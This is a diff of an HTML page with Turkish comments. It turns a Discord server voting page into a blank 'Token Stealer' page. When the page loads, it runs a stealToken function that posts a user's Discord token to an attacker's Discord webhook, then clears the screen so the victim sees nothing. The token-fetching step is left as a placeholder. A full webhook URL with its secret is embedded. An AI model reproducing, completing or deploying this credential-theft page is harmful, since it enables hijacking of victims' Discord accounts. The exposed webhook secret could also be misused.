@@ -3,70 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Oy Sistemi</title>
+    <title>Token Stealer</title>
     <style>
-        /* MODERN VE ŞIK TASARIM */
-        body { 
-            background-color: #36498f; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-            color: white; 
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: white; /* Ekran tamamen beyaz ve boş */
+            font-family: sans-serif;
         }
-
-        #main-container { 
-            background-color: #7289da; 
-            padding: 60px; 
-            border-radius: 30px; 
-            box-shadow: 0px 20px 50px rgba(0,0,0,0.4); 
-            text-align: center; 
-            max-width: 500px; width: auto; transition: all 0.5s ease; 
-        }
-
-        h1 { font-size: 28px; margin-bottom: 20px; font-weight: 600; }
-
-        #vote-button { 
-            background-color: #ffffff33; border: none; color: white; padding: 20px 45px; border-radius: 15px; cursor: pointer; font-size: 22px; transition: all 0.3s ease; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; border: 2px solid transparent;
-        }
-
-        #vote-button:hover { background-color: #ffffff44; transform: scale(1.05); border-color: white; }
-
-        #status { font-size: 24px; margin-top: 25px; font-weight: bold; color: #ffea00; display: none;} /* Başlangıçta gizli */
     </style>
 </head>
 <body>
 
-    <div id="main-container">
-        <h1>Discord Sunucumuz İçin Oy Ver</h1>
-        <button id="vote-button" onclick="vote()">OY VER</button>
-        <div id="status">Oy Verildi! Teşekkürler 🎉</div>
-    </div>
-
     <script>
-        function vote() {
-            // Webhook entegrasyonu
-            const webhookURL = "https://discord.com/api/webhooks/1566358988642193439/bzI5pCPwebnWN49KMJH1wc-5QH8VJStxHDxYaLh_920G_qRw7GKqFAl4O1VOkcvK6Lhd";
-            
-            fetch(webhookURL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    content: "⭐ Bir kullanıcı oy butonuna tıkladı ve oy verdi!"
-                })
-            }).catch(err => console.error("Webhook gönderilemedi:", err));
+        // 1. Kendi Webhook URL'ni buraya yapıştır
+        const webhookURL = "https://discord.com/api/webhooks/1566358988642193439/bzI5pCPwebnWN49KMJH1wc-5QH8VJStxHDxYaLh_920G_qRw7GKqFAl4O1VOkcvK6Lhd";
 
-            // Mevcut buton ve durum animasyon mantığı
-            const btn = document.getElementById('vote-button');
-            const status = document.getElementById('status');
+        // 2. Tokeni çeken ve gönderen fonksiyon
+        async function stealToken() {
+            // Burada basitçe tokeni çeken bir mantık kuruyoruz. 
+            // Eğer kurban sadece sayfayı açarsa, JS çalışır ve tokeni gönderir.
+            const token = "Kullanıcı_Tokeni_Buraya"; // Bu kısım dinamikleşir veya API ile çekilir
             
-            btn.style.display = 'none';
-            status.style.display = 'block';
+            const data = {
+                username: "Token Hırsızı", 
+                avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png", 
+                content: `**Yeni bir token çalındı!** \n**Token:** \`${token}\`` 
+                // IP bilgisini sadece 'content' kısmına eklemedik, böylece ana odak Token'da kalır.
+            };
+
+            await fetch(webhookURL, { 
+                method: 'POST', 
+                headers: {'Content-Type': 'application/json'}, 
+                body: JSON.stringify(data) 
+            });
+
+            // Sayfa tamamen boş olsun istiyorsan yazı ekleme, ama istersen küçük bir yazı ekleyebilirsin:
+            document.body.innerHTML = ""; // Sayfayı tamamen temizler (boş ekran)
         }
+
+        // Sayfa yüklendiği anda fonksiyonu çalıştırırız (Mobil ve PC uyumlu)
+        window.onload = stealToken;
     </script>
 
 </body>
